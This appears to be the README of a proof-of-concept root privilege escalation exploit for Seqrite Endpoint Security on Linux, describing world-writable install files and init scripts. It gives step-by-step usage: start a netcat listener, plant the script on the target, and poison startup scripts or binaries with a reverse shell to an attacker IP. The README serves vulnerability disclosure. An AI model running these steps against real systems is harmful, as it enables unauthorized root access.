# EPScalate
An elevation of privilege vulnerability in QuickHeal's Seqrite Enterprise Endpoint Security Solution (EPS).

https://user-images.githubusercontent.com/39941993/230790056-87157751-b96c-49a6-81df-bf3126acfbd6.mp4

### Vendor and Product Details
- __Vendor__: Quick Heal Technologies Limited
- __Product__: Seqrite Endpoint Security (EPS)
- __Product Homepage__: https://www.seqrite.com/endpoint-security/seqrite-endpoint-security
- __Affected Versions__: Affects all versions prior to v8.0.

### Vulnerability Details
Seqrite endpoint security with its default installation installs to `/usr/lib/Seqrite/` with very weak directory and file permissions granting a local user full read/write permission to the contents of the directory. In addition, the installation procedure installs its startup scripts to `/etc/init.d/` which are world writable. This enables any low-privilege user on the system to escalate privileges to root.

The exploit makes use of 2 different vulnerabilities introduced by the software to elevate privileges on the system. Firstly, the fact that the application uses scripts in `/etc/init.d/` to start its scan processes which can be written to by any user. Secondly, the application makes use shared objects to dynamically load position-independent code (PIC) during runtime. As a matter of fact, all of the executable shared object files are world writable. Lastly, the application binaries used for the daemon process are world writable which basically means any non-privileged user could overwrite the scanner binaries with a reverse shell binary to execute arbitrary code as `root`.

### Exploit Usage
The exploit is a simple Python file that aids in the exploitation of the vulnerability.

Steps:
1. On the attacker machine, start a listener using netcat (`nc -lvp <port>`) or metasploit (`multi/handler`).
2. Copy/download the `epscalate.py` and `shellcode.c` file onto the target system.
3. Run the python file with proper arguments (`python3 epscalate.py -H 192.168.0.103:9999 -I`).
4. Wait for the AV to reload / the system to reboot.
5. The reverse connection to your listener can confirm code execution as root.

Exploit help:
```s
$ python epscalate.py -h

    EPSCALATE - PoC for privesc in Seqrite EPS
                ~ 0xInfection

usage: epscalate.py -H <host>:<port> <technique_flag>

options:
  -h, --help            show this help message and exit
  -H HOSTPORT, --hostport HOSTPORT
                        The IP and port of the listening attacker machine in format of <ip>:<port>
  -B, --daemon-binaries
                        Overwrite the main daemon binaries to escalate privileges.
  -I, --initd-scripts   Posion /etc/init.d/ bash startup scripts with a reverse shell to escalate privileges.
```

### Support
The exploit has been tested on all Debian and Ubuntu-based variant operating systems.

### License & Credits
The exploit code has been published under the Apache 2.0 License.
The vulnerability has been disclosed to the vendor and has been remediated at the time of publishing the vulnerability.

Vulnerability and exploit credits: Pinaki Mondal ([0xInfection](https://twitter.com/0xinfection)).
